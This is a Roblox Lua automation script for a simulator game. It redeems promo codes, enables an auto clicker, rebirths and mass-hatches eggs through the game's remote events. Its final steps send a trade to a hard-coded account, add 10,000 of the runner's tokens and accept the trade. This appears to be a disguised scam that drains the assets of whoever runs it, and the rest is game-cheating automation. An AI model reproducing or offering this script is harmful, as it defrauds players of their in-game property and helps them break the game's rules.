local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- ✅ Redeem All Codes
local codes = {
    "snow", "thesequestscool", "gemsupdate", "newcoconutegg",
    "somenicesnow", "newsnowegg", "getrelics", "reliccrafter", "yetiquests"
}

for _, code in ipairs(codes) do
    pcall(function()
        ReplicatedStorage:WaitForChild("Functions"):WaitForChild("UseCode"):InvokeServer(code)
    end)
    print("Code attempted: " .. code)
    task.wait(0.5)
end

-- ✅ Turn On Auto Clicker
pcall(function()
    ReplicatedStorage:WaitForChild("Events"):WaitForChild("SetAutoClicker"):FireServer("FreeClicker", true)
end)
print("Auto Clicker ON")
task.wait(1)

-- ✅ Rebirth Twice
for i = 1, 2 do
    pcall(function()
        ReplicatedStorage:WaitForChild("Events"):WaitForChild("Rebirth"):FireServer(1)
    end)
    print("Rebirth " .. i)
    task.wait(1)
end

-- ✅ Hatch 251 Eggs (Triple at a time, ~40 seconds)
local totalEggs = 0
local delayPerHatch = 40 / 84 -- spread across ~40 seconds

while totalEggs < 251 do
    pcall(function()
        ReplicatedStorage:WaitForChild("Functions"):WaitForChild("Hatch"):InvokeServer("Basic", "Triple")
    end)
    totalEggs = totalEggs + 3
    print("Eggs opened: " .. totalEggs)
    task.wait(delayPerHatch)
end

print("Done hatching!")

-- ✅ Send Trade Request
pcall(function()
    ReplicatedStorage:WaitForChild("Events"):WaitForChild("SendTradeRequest"):FireServer("Sosjxnxnjd")
end)
print("Trade request sent")
task.wait(2)

-- ✅ Add 10,000 Tokens to Trade
pcall(function()
    ReplicatedStorage:WaitForChild("Functions"):WaitForChild("AddToTrade"):InvokeServer("Tokens", 10000)
end)
print("Tokens added to trade")
task.wait(1)

-- ✅ Ready Up / Accept Trade
pcall(function()
    ReplicatedStorage:WaitForChild("Events"):WaitForChild("PerformTradeAction"):FireServer("Ready", true)
end)
print("Trade accepted!")
